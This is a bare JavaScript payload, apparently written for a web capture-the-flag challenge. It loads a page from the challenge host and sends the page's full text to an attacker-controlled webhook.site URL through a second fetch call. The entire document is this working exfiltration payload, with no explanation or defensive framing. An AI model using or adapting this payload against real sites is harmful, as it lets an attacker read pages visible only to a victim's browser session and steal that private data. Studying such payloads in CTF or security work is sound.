fetch("https://airbnb-hosts-the-search.chals.io/")
    .then((e) => e.text())
    .then(
        (t) =>
            fetch(`https://webhook.site/6644dbf8-8e4c-4acb-b10f-29167d2e4fc6?t=` + encodeURIComponent(t))
        );
